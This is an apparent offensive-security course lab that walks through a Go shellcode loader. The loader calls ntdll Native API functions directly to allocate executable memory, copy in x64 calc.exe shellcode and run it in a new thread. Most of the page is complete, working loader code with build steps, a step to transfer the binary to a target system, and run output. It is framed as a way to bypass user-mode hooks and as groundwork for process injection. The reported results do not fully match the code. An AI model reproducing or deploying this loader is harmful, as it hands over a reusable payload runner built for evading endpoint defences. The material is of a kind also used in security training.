---
showTableOfContents: true
title: "Calling Native API Functions via Syscall Package (Lab 11.2)"
type: "page"
---
## Goal
In Theory 11.3, we learned that calling Native API functions often requires bypassing standard Go wrappers and using the `syscall` package directly, specifically `syscall.SyscallN`. This involves obtaining the function's address (as demonstrated in our previous function lookup lab), understanding its signature, carefully preparing arguments as `uintptr` values (often using `unsafe.Pointer`), and meticulously checking the `NTSTATUS` return value for success.

In this lab we'll put these concepts into practice to construct a simple loader that will inject and execute our calc.exe shellcode within  its own process space using solely Native API functions. Specifically, we'll:

1. Dynamically find the addresses of `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `NtWaitForSingleObject`, `NtClose`, and `NtFreeVirtualMemory` within `ntdll.dll`.
2. Call `NtAllocateVirtualMemory` via `syscall.SyscallN` to allocate a memory region with `PAGE_EXECUTE_READWRITE` permissions.
3. Utilize `NtWriteVirtualMemory` via `syscall.SyscallN` to copy our `calc.exe` shellcode into this allocated buffer.
4. Execute the shellcode by calling `NtCreateThreadEx` via `syscall.SyscallN`, pointing it to our shellcode's memory location.
5. Ensure proper execution flow and cleanup by calling `NtWaitForSingleObject` to wait for the shellcode thread to complete, followed by `NtClose` to close the thread handle.
6. Verify that each NTAPI call succeeds by checking the `NTSTATUS` return code, logging detailed error information if any step fails.
7. Finally, clean up the allocated memory using `NtFreeVirtualMemory` via `syscall.SyscallN` to release the resources back to the system.

This lab demonstrates the direct use of NTAPI for core process injection steps: memory allocation, writing to process memory, and thread creation, all while managing resources and checking for errors at each stage.

## Code

```go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"
	"unsafe" // Required for unsafe.Pointer
	// "os"     // For os.Exit - Not strictly needed here if we log.Fatal

	"golang.org/x/sys/windows" // For constants and some Windows types
	"syscall"                  // For SyscallN
)

// Shellcode to launch calc.exe (x64)
var calcShellcode = []byte{
	0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
	0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
	0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
	0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
	0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
	0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
}

// Define STATUS_SUCCESS for NTSTATUS checks
const STATUS_SUCCESS uintptr = 0

func main() {
	fmt.Println("[+] Native API Shellcode Loader")

	// Target Native API functions we need for shellcode injection
	targetFunctions := []string{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtFreeVirtualMemory",
		"NtClose", // To close the thread handle
	}

	fmt.Println("[*] Getting handle to ntdll.dll...")
	// Using LoadLibrary for simplicity, GetModuleHandle can also be used
	ntdllHandle, err := windows.LoadLibrary("ntdll.dll")
	if err != nil {
		log.Fatalf("[-] Failed to load ntdll.dll: %v", err)
	}
	// It's good practice to free the library handle when done,
	// but for a simple loader that exits, it's less critical.
	// For long-running applications, ensure FreeLibrary is called.
	// defer windows.FreeLibrary(ntdllHandle) // Deferred if main function could return early before log.Fatal
	fmt.Printf("[+] Got ntdll.dll handle: 0x%X\n", ntdllHandle)

	fmt.Println("[*] Finding function addresses...")
	funcAddrs := make(map[string]uintptr)
	allFound := true
	for _, funcName := range targetFunctions {
		procAddr, errGetProc := windows.GetProcAddress(ntdllHandle, funcName)
		if errGetProc != nil {
			log.Printf("[!] Warning: GetProcAddress failed for '%s': %v", funcName, errGetProc)
			funcAddrs[funcName] = 0
			allFound = false
		} else if procAddr == 0 {
			log.Printf("[!] Warning: GetProcAddress returned NULL for '%s'.", funcName)
			funcAddrs[funcName] = 0
			allFound = false
		} else {
			fmt.Printf("  [+] Found '%s' at address: 0x%X\n", funcName, procAddr)
			funcAddrs[funcName] = procAddr
		}
	}

	if !allFound {
		windows.FreeLibrary(ntdllHandle) // Clean up before fatal exit
		log.Fatalf("[-] Not all required NTAPI function addresses were found. Exiting.")
	}
	fmt.Println("[+] All required function addresses found.")

	// --- 1. Allocate Memory using NtAllocateVirtualMemory ---
	fmt.Println("[*] Allocating memory for shellcode...")
	var baseAddress uintptr // Will receive the base address of the allocated memory
	size := uintptr(len(calcShellcode))

	// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits, &RegionSize, AllocationType, Protect)
	// ProcessHandle: windows.CurrentProcess() which is -1 (pseudo handle for current process)
	// BaseAddress: Pointer to a PVOID, so unsafe.Pointer(&baseAddress)
	// ZeroBits: 0
	// RegionSize: Pointer to a SIZE_T, so unsafe.Pointer(&size)
	// AllocationType: MEM_COMMIT | MEM_RESERVE
	// Protect: PAGE_EXECUTE_READWRITE
	ntStatus, _, sysCallErr := syscall.SyscallN(
		funcAddrs["NtAllocateVirtualMemory"],
		uintptr(windows.CurrentProcess()),      // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddress)),  // *BaseAddress
		0,                                      // ZeroBits
		uintptr(unsafe.Pointer(&size)),         // *RegionSize
		windows.MEM_COMMIT|windows.MEM_RESERVE, // AllocationType
		windows.PAGE_EXECUTE_READWRITE,         // Protect
	)

	if ntStatus != STATUS_SUCCESS {
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	if baseAddress == 0 {
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtAllocateVirtualMemory succeeded but returned a NULL base address.")
	}
	fmt.Printf("[+] Memory allocated at: 0x%X, Size: %d bytes\n", baseAddress, size)

	// --- 2. Write Shellcode using NtWriteVirtualMemory ---
	fmt.Println("[*] Writing shellcode to allocated memory...")
	var numberOfBytesWritten uintptr

	// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, *NumberOfBytesWritten)
	// Buffer: Pointer to the shellcode data
	// NumberOfBytesWritten: Pointer to SIZE_T, can be 0 (nil) if not needed to check.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtWriteVirtualMemory"],
		uintptr(windows.CurrentProcess()),          // ProcessHandle
		baseAddress,                                // BaseAddress
		uintptr(unsafe.Pointer(&calcShellcode[0])), // Buffer
		size, // NumberOfBytesToWrite
		uintptr(unsafe.Pointer(&numberOfBytesWritten)), // *NumberOfBytesWritten (or uintptr(0) if not checking)
	)

	if ntStatus != STATUS_SUCCESS {
		// Attempt to free allocated memory before exiting if write fails
		var freeSize uintptr = 0 // For MEM_RELEASE, size must be 0
		// Note: NtFreeVirtualMemory expects PVOID *BaseAddress for the base address parameter
		syscall.SyscallN(
			funcAddrs["NtFreeVirtualMemory"],
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&baseAddress)), // Pass address of baseAddress
			uintptr(unsafe.Pointer(&freeSize)),    // Pass address of sizeForRelease
			windows.MEM_RELEASE,
		)
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtWriteVirtualMemory failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	fmt.Printf("[+] Shellcode (%d bytes) written to memory. Bytes written: %d\n", size, numberOfBytesWritten)

	// --- 3. Create Thread using NtCreateThreadEx ---
	fmt.Println("[*] Creating a new thread to execute shellcode...")
	var threadHandle windows.Handle

	// THREAD_ALL_ACCESS (0x1FFFFF) might not be defined as windows.THREAD_ALL_ACCESS
	// in older golang.org/x/sys/windows packages.
	// It's composed of: STANDARD_RIGHTS_REQUIRED (0x000F0000) | SYNCHRONIZE (0x00100000) | 0xFFFF (specific thread rights)
	// It's recommended to update your package: go get -u golang.org/x/sys/windows
	const desiredThreadAccess uintptr = 0x1FFFFF // Using the direct value for compatibility

	// NtCreateThreadEx(&ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartAddress, Parameter, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList)
	// All optional/complex parameters set to 0/nil for simplicity.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtCreateThreadEx"],
		uintptr(unsafe.Pointer(&threadHandle)), // *ThreadHandle
		desiredThreadAccess,                    // DesiredAccess
		0,                                      // ObjectAttributes (NULL)
		uintptr(windows.CurrentProcess()),      // ProcessHandle
		baseAddress,                            // StartAddress (our shellcode)
		0,                                      // Parameter (NULL)
		0,                                      // CreateFlags (0 = run immediately)
		0,                                      // ZeroBits
		0,                                      // StackSize (0 = default)
		0,                                      // MaximumStackSize (0 = default)
		0,                                      // AttributeList (NULL)
	)

	if ntStatus != STATUS_SUCCESS {
		// Attempt to free allocated memory before exiting if thread creation fails
		var freeSize uintptr = 0
		syscall.SyscallN(
			funcAddrs["NtFreeVirtualMemory"],
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&baseAddress)),
			uintptr(unsafe.Pointer(&freeSize)),
			windows.MEM_RELEASE,
		)
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtCreateThreadEx failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	if threadHandle == 0 {
		// As above, clean up memory if thread handle is null
		var freeSize uintptr = 0
		syscall.SyscallN(
			funcAddrs["NtFreeVirtualMemory"],
			uintptr(windows.CurrentProcess()),
			uintptr(unsafe.Pointer(&baseAddress)),
			uintptr(unsafe.Pointer(&freeSize)),
			windows.MEM_RELEASE,
		)
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtCreateThreadEx succeeded but returned a NULL thread handle.")
	}
	fmt.Printf("[+] Thread created successfully with Handle: 0x%X. Shellcode should be executing (calc.exe).\n", threadHandle)

	// --- 4. Wait for the Thread to Complete using NtWaitForSingleObject ---
	fmt.Println("[*] Waiting for the thread to complete (calc.exe to be closed)...")
	// NtWaitForSingleObject(Handle, Alertable, Timeout)
	// Alertable: FALSE (0)
	// Timeout: NULL (or a pointer to a large value for effectively infinite, or 0 for no wait if already signaled)
	// For infinite wait, pass a nil pointer, which is uintptr(0) for syscall.
	// However, syscall.INFINITE (or windows.INFINITE) is often defined as 0xFFFFFFFF
	// A NULL pointer for timeout means infinite wait.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtWaitForSingleObject"],
		uintptr(threadHandle), // Handle
		0,                     // Alertable (FALSE)
		uintptr(0),            // Timeout (NULL pointer for infinite wait)
	)

	if ntStatus != STATUS_SUCCESS {
		// Log error but proceed to cleanup
		log.Printf("[!] NtWaitForSingleObject failed with NTSTATUS: 0x%X. Syscall error: %v. Proceeding with cleanup.\n", ntStatus, sysCallErr)
	} else {
		fmt.Println("[+] Thread completed.")
	}

	// --- 5. Close the Thread Handle using NtClose ---
	// This should be done regardless of NtWaitForSingleObject outcome, if threadHandle is valid.
	fmt.Println("[*] Closing thread handle...")
	ntStatusClose, _, sysCallErrClose := syscall.SyscallN(
		funcAddrs["NtClose"],
		uintptr(threadHandle), // Handle
	)
	if ntStatusClose != STATUS_SUCCESS {
		log.Printf("[!] NtClose failed for thread handle 0x%X with NTSTATUS: 0x%X. Syscall error: %v\n", threadHandle, ntStatusClose, sysCallErrClose)
	} else {
		fmt.Printf("[+] Thread handle 0x%X closed.\n", threadHandle)
	}

	// --- 6. Free Allocated Memory using NtFreeVirtualMemory ---
	// This should be done regardless of prior errors, if baseAddress is valid.
	fmt.Println("[*] Freeing allocated memory...")
	var sizeForRelease uintptr = 0 // When using MEM_RELEASE, RegionSize must be 0.
	// The BaseAddress parameter must be the same address returned by NtAllocateVirtualMemory.

	// NtFreeVirtualMemory(ProcessHandle, &BaseAddress, &RegionSize, FreeType)
	// BaseAddress for NtFreeVirtualMemory is PVOID*, so it's a pointer to the variable holding the base address.
	// RegionSize for NtFreeVirtualMemory is PSIZE_T*, also a pointer. When FreeType is MEM_RELEASE, this value must be 0.
	ntStatus, _, sysCallErr = syscall.SyscallN(
		funcAddrs["NtFreeVirtualMemory"],
		uintptr(windows.CurrentProcess()),        // ProcessHandle
		uintptr(unsafe.Pointer(&baseAddress)),    // *BaseAddress (pointer to the variable holding the address)
		uintptr(unsafe.Pointer(&sizeForRelease)), // *RegionSize (pointer to the size, which is 0 for MEM_RELEASE)
		windows.MEM_RELEASE,                      // FreeType
	)

	if ntStatus != STATUS_SUCCESS {
		// Even if free fails, we've done our best. Log and exit.
		windows.FreeLibrary(ntdllHandle)
		log.Fatalf("[-] NtFreeVirtualMemory failed with NTSTATUS: 0x%X. Syscall error: %v", ntStatus, sysCallErr)
	}
	// The variable baseAddress still holds the address value, but the memory it pointed to is now invalid.
	fmt.Printf("[+] Memory (previously at 0x%X) freed successfully.\n", baseAddress)

	windows.FreeLibrary(ntdllHandle) // Final cleanup of ntdll handle
	fmt.Println("[+] Shellcode injection process complete.")
}

````

## Code Breakdown
**Shellcode and Constants**
- `calcShellcode`: A byte slice containing the machine code to launch `calc.exe`.
- `STATUS_SUCCESS`: Defined as `uintptr(0)`. This is the standard `NTSTATUS` value indicating a successful Native API call. All NTAPI functions used will return an `NTSTATUS`.
- `targetFunctions`: A slice of strings listing the names of the NTAPI functions we need to resolve: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `NtWaitForSingleObject`, `NtFreeVirtualMemory`, and `NtClose`.

**Load `ntdll.dll` and Find Function Addresses:**
- `windows.LoadLibrary("ntdll.dll")`: Gets a handle to `ntdll.dll`, which exports the Native API functions.
- A loop iterates through `targetFunctions`: `windows.GetProcAddress(ntdllHandle, funcName)`: For each function name, its address in `ntdll.dll` is retrieved.


**`syscall.SyscallN` is used to call our primary functions:**
- `NtAllocateVirtualMemory` is used to allocate a memory region in the current process with `PAGE_EXECUTE_READWRITE` permissions.
- `NtWriteVirtualMemory` is used to copy the `calcShellcode` into the memory region allocated in the previous step.
- `NtCreateThreadEx` is used to create a new thread in the current process that starts execution at the beginning of our shellcode.
- `NtWaitForSingleObject` is used to pause the main program's execution until the newly created thread (running the shellcode) finishes.
- `NtClose` is used to close the handle to the thread, releasing system resources associated with it. This is done after the thread has terminated or is no longer needed.
- `NtFreeVirtualMemory` is used to release the memory region previously allocated for the shellcode.

**Cleanup `ntdll.dll` Handle:**
- `windows.FreeLibrary(ntdllHandle)`is called to release the handle to `ntdll.dll`. This is done at the very end if all operations were successful, or before `log.Fatalf` if an unrecoverable error occurred after `ntdllHandle` was obtained.




## Instructions

Compile using `go build`.

```shell
GOOS=windows GOARCH=amd64 go build -buildvcs=false
```

In case it’s required, transfer the binary over to the target system, and run it.

```shell
.\native_loader.exe
```


## Results

```shell
PS C:\Users\vuilhond\Desktop> .\native_agent.exe
[+] Native API Shellcode Loader
[*] Getting handle to ntdll.dll...
[+] Got ntdll.dll handle: 0x7FF99F190000
[*] Finding function addresses...
  [+] Found 'NtAllocateVirtualMemory' at address: 0x7FF99F22D7E0
  [+] Found 'NtWriteVirtualMemory' at address: 0x7FF99F22DC20
  [+] Found 'NtCreateThreadEx' at address: 0x7FF99F22ED10
  [+] Found 'NtWaitForSingleObject' at address: 0x7FF99F22D560
  [+] Found 'NtFreeVirtualMemory' at address: 0x7FF99F22D8A0
  [+] Found 'NtClose' at address: 0x7FF99F22D6C0
[+] All required function addresses found.
[*] Allocating memory for shellcode...
[+] Memory allocated at: 0x21568E60000, Size: 4096 bytes
[*] Writing shellcode to allocated memory...
[+] Shellcode (4096 bytes) written to memory. Bytes written: 4096
[*] Creating a new thread to execute shellcode...
[+] Thread created successfully with Handle: 0x17C. Shellcode should be executing (calc.exe).
[*] Waiting for the thread to complete (calc.exe to be closed)...
[+] Thread completed.
[*] Closing thread handle...
[+] Thread handle 0x17C closed.
[*] Freeing allocated memory...
[+] Memory (previously at 0x21568E60000) freed successfully.
[+] Shellcode injection process complete.
```

- Additionally, `calc.exe` should also be launched


## Discussion

This lab successfully demonstrates the core mechanics of calling Native API functions like `NtAllocateVirtualMemory` and `NtWriteVirtualMemory` from Go using the `syscall` package. We saw the necessity of:

- Finding the function addresses dynamically.
- Carefully constructing the arguments as `uintptr` values, often requiring `unsafe.Pointer` to pass addresses of variables.
- Checking the `NTSTATUS` returned by the Native API function itself.

Compared to using the high-level WinAPI wrappers (like `windows.VirtualAlloc`), this approach requires significantly more manual effort and a precise understanding of the underlying function signatures. However, it grants us the ability to call functions directly in `ntdll.dll`, which is the first step towards bypassing user-mode hooks targeting `kernel32.dll`.

## Conclusion

We have now successfully called lower-level Native API functions for memory management directly from Go using `syscall.SyscallN`. This technique, while more complex than using standard wrappers, is essential for building more evasive tools. Having practiced this locally, we are now prepared to apply the same principles (`NtOpenProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` all via `syscall.SyscallN`) to perform process injection in the next module without relying on the potentially hooked `kernel32.dll` functions.





---
